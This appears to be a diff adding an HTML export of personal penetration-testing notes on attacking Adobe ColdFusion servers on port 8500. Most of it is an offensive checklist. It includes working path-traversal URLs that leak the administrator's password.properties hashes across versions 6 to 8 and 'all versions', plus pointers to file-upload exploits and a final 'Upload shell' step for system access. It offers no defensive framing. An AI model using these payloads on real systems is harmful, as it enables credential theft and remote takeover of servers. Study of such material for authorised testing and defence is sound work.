@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>8500 - Adobe ColdFusion</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Port 8500 - Adobe ColdFusion</h1></strong><br />Adobe ColdFusion&#39;s default port is 8500 and is ridiculously vulnerable.<br />From the Administrator panel you can get a system shell.<br /><br /><strong><h2>## Checklist</h2></strong><br />• Find version<br />   ◇ <code>http://coldfusion-site.com:8500/cfdocs/dochome.htm</code><br />   ◇ <code>http://coldfusion-site.com:8500/CFIDE/administrator</code><br />• Check version for exploits<br />   ◇ ColdFusion 8 - File upload<br />• 2 Potential Login Pages<br />   ◇ <code>http://coldfusion-site.com:8500/CFIDE/component</code><br />   ◇ <code>http://coldfusion-site.com:8500/CFIDE/administrator</code><br />• Leak password hashes<br />   ◇ <table class="table"><tr><th>LFI</th><th> Affects</th></tr><tr><td> http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en</td><td> ColdFusion 6</td></tr><tr><td> http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en</td><td> ColdFusion 7</td></tr><tr><td> http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en</td><td> ColdFusion 8</td></tr><tr><td> http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en</td><td> All versions</td></tr></table><br />   ◇ Can&#39;t crack hash? Try using javascript to leak to real password (refer to sub-node)<br /><br /><strong><h3>### With access</h3></strong><br />• Upload shell</div>
+</body>
+</html>
